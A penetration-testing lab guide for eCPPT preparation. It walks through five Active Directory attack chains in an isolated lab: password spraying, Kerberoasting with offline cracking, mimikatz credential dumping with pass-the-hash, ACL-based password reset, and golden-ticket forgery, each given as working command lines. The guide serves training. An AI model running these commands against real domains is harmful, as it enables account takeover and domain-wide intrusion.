# Guided Attack Simulations in the AD Lab

> 02-RedTeam · eCPPT labs — INE-Cybersecurity-Certifications-Guide (English)

Five guided attack chains that mirror the way professional penetration tests
against Windows/Active Directory environments actually flow. Each scenario has
clear objectives, numbered steps, an expected outcome, and a verification
checklist. All traffic stays inside your isolated lab from
[ad-lab-setup.md](ad-lab-setup.md).

## Lab state and house rules

Hosts and credentials are defined in [ad-lab-setup.md](ad-lab-setup.md):
`DC01` (10.0.0.10, DC+DNS), `SRV01` (10.0.0.11, delegation target), `WS01`
(DHCP workstation), `KALI` (10.0.0.50).

House rules:

- **Start every scenario from the `02-Lab-Clean` snapshot.**
- Accounts used: `bob` (local admin on SRV01, password `Autumn2024!`), `mike`
  (local admin on WS01 — add him with `Add-LocalGroupMember -Group
  Administrators -Member CORP\mike` on WS01 if not done), `svc_sql`
  (Kerberoastable, local admin on SRV01, `sqlp@ss123`), `da.smith` (Domain
  Admin), built-in `Administrator` password `LocalAdm!2024` on the member
  hosts (SRV01/WS01 — a DC has no local accounts, so on DC01 the built-in
  `Administrator` is the *domain* account and its password is the DSRM/domain one).
- If a scenario changes a password or krbtgt state, **revert the snapshot**
  before the next scenario.

---

## Scenario 1 — Initial foothold: password spraying

**Objective:** from Kali, find valid domain credentials with a low-and-slow
password spray and get a shell on the network. This models the "start with
nothing but a wordlist" eCPPT-style foothold.

**Steps:**

```bash
# 1. Build a small user list from OSINT-style guesses (names you created)
printf 'alice\nbob\nmike\nsvc_sql\nda.smith\n' > users.txt

# 2. Spray ONE password (Autumn2024!) — netexec (nxc), ex-CrackMapExec.
#    --continue-on-success keeps going after a valid hit.
nxc smb 10.0.0.0/24 -u users.txt -p 'Autumn2024!' --continue-on-success

# 3. A [+] line shows a valid credential; admin users show (Pwn3d!)
#    bob is local admin on SRV01 -> WinRM shell:
evil-winrm -i 10.0.0.11 -u bob -p 'Autumn2024!'
```

**Expected outcome:** `nxc` reports `bob:Autumn2024!` (and likely `mike`) as
valid; you land an interactive `evil-winrm` session on `SRV01` as `bob`. Run
`whoami /groups` and `net localgroup Administrators` to confirm bob's rights.

**Verify:**

- [ ] Spray output shows at least one `[+]` credential and no lockouts
- [ ] `evil-winrm` shell on SRV01 returns `corp\bob`
- [ ] I recorded the finding (user, host, method) like an engagement note

---

## Scenario 2 — Kerberoasting: cracking a service account

**Objective:** enumerate AD with BloodHound, identify a Kerberoastable service
account (`hasspn`), request its TGS, crack it offline, and reuse the password.

**Steps:**

```bash
# 1. Collect AD data with the low-priv credentials (see bloodhound-guide.md)
bloodhound-python -u bob -p 'Autumn2024!' -d corp.local -ns 10.0.0.10 -c All

# 2. Request a TGS for every SPN user (svc_sql appears here)
impacket-GetUserSPNs -dc-ip 10.0.0.10 'corp.local/bob:Autumn2024!' -request -outputfile tgs.txt

# 3. Crack the TGS (mode 13100 = Kerberoast TGS-REP), then read the recovered password.
# `--show` only prints what is already in the potfile: it never cracks, so it is a second
# command, not a flag on the first one.
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 tgs.txt --show
```

**Expected outcome:** the TGS for `svc_sql` cracks to `sqlp@ss123` — a domain
credential you did not spray for. BloodHound (legacy or CE) should already show
`svc_sql` with the SPN and as local admin on SRV01.

**Verify:**

- [ ] `GetUserSPNs` output lists `svc_sql/MSSQLSvc/sql01.corp.local:1433`
- [ ] `hashcat --show` prints the recovered password
- [ ] I can log into SRV01 as `svc_sql` (`evil-winrm -i 10.0.0.11 -u svc_sql -p 'sqlp@ss123'`)

---

## Scenario 3 — Lateral movement: pass-the-hash to Domain Admin

**Objective:** move laterally using hashes instead of passwords: capture the
NTLM hash of a Domain Admin who logs into SRV01, then pass that hash to reach
the DC.

**Steps:**

```powershell
# 1. Lab prep: simulate a real admin logon on SRV01 so a DA token exists.
#    RDP into SRV01 as da.smith (or: runas /user:corp\da.smith cmd.exe), keep the session open.
```

```text
# 2. From your svc_sql/bob shell on SRV01, dump logon credentials (lab only!)
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
#    -> find the da.smith entry and copy its NTLM hash (aad3b...:2e2e...)
```

```bash
# 3. From Kali, validate the hash against the DC, then take a DA shell
nxc smb 10.0.0.10 -u da.smith -H '<NTLM_HASH>'
evil-winrm -i 10.0.0.10 -u da.smith -H '<NTLM_HASH>'
whoami /groups | findstr /i "Domain Admins"    # inside the Windows shell: findstr
# PowerShell alternative: whoami /groups | Select-String "Domain Admins"
```

**Expected outcome:** `nxc` shows `(Pwn3d!)` for `da.smith` on DC01 and
`evil-winrm` gives you a Domain Admin shell — no password ever typed. This is
pass-the-hash across two hosts (SRV01 → DC01).

**Verify:**

- [ ] mimikatz recovered a `da.smith` NTLM hash from memory
- [ ] The same hash authenticates to DC01 without a password
- [ ] I can `dir \\DC01\C$` from the DA session

---

## Scenario 4 — ACL abuse: from low-priv user to Domain Admin

**Objective:** exploit a misconfigured ACL instead of a password. `mike` holds
the *ForceChangePassword* (reset password) right over `da.smith` — abuse it to
become a Domain Admin.

**Steps:**

```bash
# 1. Shell as mike on WS01 (or wherever he is local admin).
#    WS01 takes its address from DHCP (see ad-lab-setup.md), so look the lease up
#    first (nxc smb 10.0.0.0/24, or the DHCP console on DC01) and substitute it.
evil-winrm -i <WS01-IP> -u mike -p 'Autumn2024!'

# 2. Confirm the delegation/ACL — mike is NOT a DA member, just has the right
whoami /groups
```

```bat
:: 3. Reset da.smith's password using only that delegated right
net user da.smith 'Reset!Pass2024' /domain
```

```bash
# 4. Authenticate as the new da.smith -> Domain Admin
evil-winrm -i 10.0.0.10 -u da.smith -p 'Reset!Pass2024'
whoami /groups | findstr /i "Domain Admins"
```

**Expected outcome:** a completely unprivileged account (`mike`) escalates to
Domain Admin purely through a delegated password-reset ACE — no exploit, no
cracking. This is why BloodHound flags `ForceChangePassword` edges.

**Verify:**

- [ ] `net user da.smith … /domain` succeeded from mike's session
- [ ] New `da.smith` password works against DC01
- [ ] I can explain *which ACE* made this possible and where it was configured

---

## Scenario 5 — Full domain compromise: golden ticket

**Objective:** with Domain Admin access, extract the `krbtgt` hash, forge a
golden ticket, and prove it grants access to any host without further
authentication — then revert so the lab stays reusable.

**Steps:**

```text
# 1. On DC01 (DA shell): extract krbtgt and note the DOMAIN SID
mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:corp.local /user:krbtgt" exit
#    domain SID: run "whoami /user" on any domain host and strip the last RID
#    e.g. S-1-5-21-1234567890-1234567890-1234567890-512 -> use without -512

# 2. Forge a golden ticket for any identity and inject it (PTT)
mimikatz.exe "kerberos::golden /user:da.smith /domain:corp.local /sid:S-1-5-21-<DOMAIN_SID> /krbtgt:<KRBTGT_NTLM> /ptt" exit

# 3. Prove access WITHOUT any password/hash
dir \\DC01\C$
dir \\SRV01\C$
```

```bash
# Kali alternative for the same idea:
impacket-ticketer -nthash <KRBTGT_NTLM> -domain-sid S-1-5-21-<DOMAIN_SID> \
                  -domain corp.local fakeadmin
export KRB5CCNAME=fakeadmin.ccache
impacket-psexec -k -no-pass corp.local/fakeadmin@DC01.corp.local   # needs DNS name + /etc/hosts
```

**Expected outcome:** the forged TGT unlocks any resource in the domain (C$
shares, services) for its full validity — the defining "domain owned" signal.
Blue-team takeaway: rotate `krbtgt` twice after a suspected compromise.

**Verify:**

- [ ] Golden ticket grants `dir \\DC01\C$` with no credentials
- [ ] I can explain why krbtgt + domain SID are all that is needed
- [ ] Snapshot reverted afterwards (krbtgt/DA state reset)

---

## Common Mistakes & Tips

- **Skipping the snapshot** — scenarios change passwords and krbtgt state;
  without a revert point the lab degrades after one run.
- **Locking accounts with sprays** — keep the spray slow (one password) and
  watch `--continue-on-success`; default AD policy locks after a handful of
  failures.
- **Kerberoasting as DA** — request TGSs with the *lowest* credential that can
  read SPNs; using DA taints the whole exercise.
- **Expecting a DA session to exist** — session collection and mimikatz need
  someone to *actually* log in; simulate the logon, then collect.
- **Passing hashes to the wrong protocol** — NTLM hashes work over SMB/WinRM
  (NTLM auth); Kerberos-only endpoints (e.g., some HTTPS/ADCS paths) need
  tickets instead.
- **Golden tickets with the wrong SID** — use the domain SID *without* the
  trailing `-512`; tickets fail everywhere otherwise.
- **Not writing findings down** — treat each scenario as a mini-engagement:
  user, host, technique, evidence, impact. That discipline is what the report
  phase (and real work) demands.

## Checklist / Self-Test

- [ ] I can obtain a foothold with a password spray and explain the lockout risk
- [ ] I can Kerberoast a service account and crack the TGS offline
- [ ] I can capture an NTLM hash and pass it laterally to a Domain Controller
- [ ] I can escalate via a delegated `ForceChangePassword` ACL without exploits
- [ ] I can forge a golden ticket and validate domain-wide access
- [ ] I revert to the clean snapshot between scenarios and document each run

> **Verification:** commands checked against Windows `findstr` and PowerShell `Select-String` (`whoami /groups | findstr /i "Domain Admins"`), run on Windows 10.0.26200 and PowerShell 7.6.6 on 2026-09-19: `findstr` is available inside a `cmd`/`evil-winrm` session, `grep` is not. Corrections applied from the 19 Sep 2026 audit.

## Further Resources

- [HackTricks — Active Directory methodology](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology.html)
- [MITRE ATT&CK — T1110.003 Password Spraying](https://attack.mitre.org/techniques/T1110/003/)
- [MITRE ATT&CK — T1558.003 Kerberoasting](https://attack.mitre.org/techniques/T1558/003/)
- [MITRE ATT&CK — T1550.002 Pass the Hash](https://attack.mitre.org/techniques/T1550/002/)
- [MITRE ATT&CK — T1098 Account Manipulation (ACL abuse)](https://attack.mitre.org/techniques/T1098/)
- [Impacket — official repository](https://github.com/fortra/impacket)
- [NetExec — official repository](https://github.com/Pennyw0rth/NetExec)
